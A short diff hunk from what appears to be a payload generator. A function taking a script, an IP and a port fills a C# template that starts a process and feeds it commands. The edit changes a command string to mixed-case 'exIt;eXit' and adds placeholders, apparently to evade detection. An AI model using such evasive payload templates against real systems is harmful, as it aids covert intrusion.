@@ -114,7 +114,7 @@ def cs_update(script, ip, port):
                 Thread.Sleep({10});
             	{5}.Start();
             	{5}.StandardInput.WriteLine({4});
-            	{5}.StandardInput.WriteLine("exit;exit;;;{1}{9}{2}{10}{3}{1}{2}");
+            	{5}.StandardInput.WriteLine("echo {7};exIt;eXit;{1}{9}{2}{10}{3}{1}{2}");
             	{5}.Close();
         	}}
         	catch (Exception)
